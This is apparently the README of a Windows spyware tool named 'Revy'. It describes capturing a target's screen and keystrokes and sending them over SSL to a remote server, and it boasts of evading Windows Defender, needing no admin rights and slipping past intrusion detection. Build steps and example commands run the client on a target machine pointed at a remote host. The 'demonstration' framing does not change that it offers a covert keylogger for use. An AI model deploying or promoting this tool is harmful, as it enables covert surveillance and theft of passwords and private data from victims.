# <center> Revy - Windows Display & Keyboard Data Exfiltration </center>

This program is designed to be a demonstration of how vulnerable windows is to data exfiltration to a remote server.  
It reads the target's screen, compresses the raw data 100:1 for data extraction, and simultaneously captures the key inputs during this time as well. These two things are sent to a remote server over SSL to prevent IDS detection. To my knowledge this __isn't detected__ by windows defender as malware, it __doesn't require__ admin escalation, and isn't susceptible to __PPI__ or other IDS exfil prevention techniques.

## TODO
- Add web controller for the server component
- Add server to client reconfigureability

## Installation

__To compile for Windows__
- Download OpenSSL
- Set OPENSSL_DIR to the OpenSSL install location
- Build via cargo

__To compile for a remote server__
- SSL guide coming soon
- Build via cargo

## Usage
Start the remote server and start the client process on the target machine.
The target address (domain for SSL, IP for TCP) should be set in launch options
Ex:
```
TCP
./revy.exe 10.0.0.1 443
SSL
./revy.exe -s example.domain.xyz 443
```
## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)
